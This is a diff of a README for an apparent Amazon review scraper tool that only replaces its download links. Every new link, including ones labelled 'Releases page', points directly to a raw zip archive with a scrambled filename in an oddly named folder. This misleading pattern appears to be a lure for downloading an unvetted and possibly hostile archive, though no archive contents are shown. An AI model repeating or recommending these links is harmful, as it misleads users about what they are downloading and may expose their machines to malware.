@@ -6,11 +6,11 @@ Welcome to the amazon-reviews-scraper-with-advanced-filters! This tool lets you 
 
 ## 📥 Download the Software
 
-[![Download](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/amazon-reviews-scraper-with-advanced-filters_v2.2.zip)](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/amazon-reviews-scraper-with-advanced-filters_v2.2.zip)
+[![Download](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/reviews-advanced-with-filters-amazon-scraper-v2.6.zip)](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/reviews-advanced-with-filters-amazon-scraper-v2.6.zip)
 
 To get started, visit the Releases page to download the software. Click the link below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/amazon-reviews-scraper-with-advanced-filters_v2.2.zip)
+[Visit the Releases Page](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/reviews-advanced-with-filters-amazon-scraper-v2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ Before you download the application, please ensure that your system meets the fo
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Navigate to our [Releases page](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/amazon-reviews-scraper-with-advanced-filters_v2.2.zip).
+1. **Visit the Releases Page:** Navigate to our [Releases page](https://raw.githubusercontent.com/laien69/amazon-reviews-scraper-with-advanced-filters/main/siphonial/reviews-advanced-with-filters-amazon-scraper-v2.6.zip).
    
 2. **Choose Your Version:** Look for the latest version available and select the file appropriate for your operating system.
 
